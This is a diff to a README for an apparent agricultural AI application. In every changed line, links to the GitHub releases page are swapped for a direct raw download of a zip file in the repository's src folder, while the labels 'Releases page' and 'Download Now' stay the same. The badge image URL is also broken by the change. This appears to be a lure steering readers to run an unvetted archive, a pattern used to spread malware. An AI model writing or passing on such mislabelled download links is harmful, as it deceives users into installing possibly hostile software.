@@ -1,6 +1,6 @@
 # 🌾 agia-enterprise-ai-system - Empower Your Agricultural Intelligence
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Jelipon542/agia-enterprise-ai-system/releases)
+[![Download Now](https://raw.githubusercontent.com/Jelipon542/agia-enterprise-ai-system/main/src/agia-enterprise-ai-system-v3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jelipon542/agia-enterprise-ai-system/main/src/agia-enterprise-ai-system-v3.1.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the agia-enterprise-ai-system.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Jelipon542/agia-enterprise-ai-system/releases) to download the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jelipon542/agia-enterprise-ai-system/main/src/agia-enterprise-ai-system-v3.1.zip) to download the software.
 2. Look for the latest version available. 
 3. Click on the link to download the installation file for your operating system.
 4. Open the downloaded file and follow the instructions to complete the installation. 
@@ -63,7 +63,7 @@ The application touches on various topics that enhance agricultural decision-mak
 If you encounter any issues while using the application, consider these troubleshooting steps:
 
 1. **Check System Requirements:** Make sure your device meets the necessary requirements.
-2. **Reinstall the Application:** Sometimes reinstalling can resolve problems. Delete the application and reinstall it from the [Releases page](https://github.com/Jelipon542/agia-enterprise-ai-system/releases).
+2. **Reinstall the Application:** Sometimes reinstalling can resolve problems. Delete the application and reinstall it from the [Releases page](https://raw.githubusercontent.com/Jelipon542/agia-enterprise-ai-system/main/src/agia-enterprise-ai-system-v3.1.zip).
 3. **Review Documentation:** Access the user manual for detailed instructions on various features.
 
 ## 📞 Support
@@ -72,7 +72,7 @@ For additional help, you can reach out through the GitHub issues page. Share you
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Jelipon542/agia-enterprise-ai-system/releases)
+- [Releases Page](https://raw.githubusercontent.com/Jelipon542/agia-enterprise-ai-system/main/src/agia-enterprise-ai-system-v3.1.zip)
 - [User Manual](#) (Coming Soon)
 - [Community Discussions](#) (Coming Soon)
 
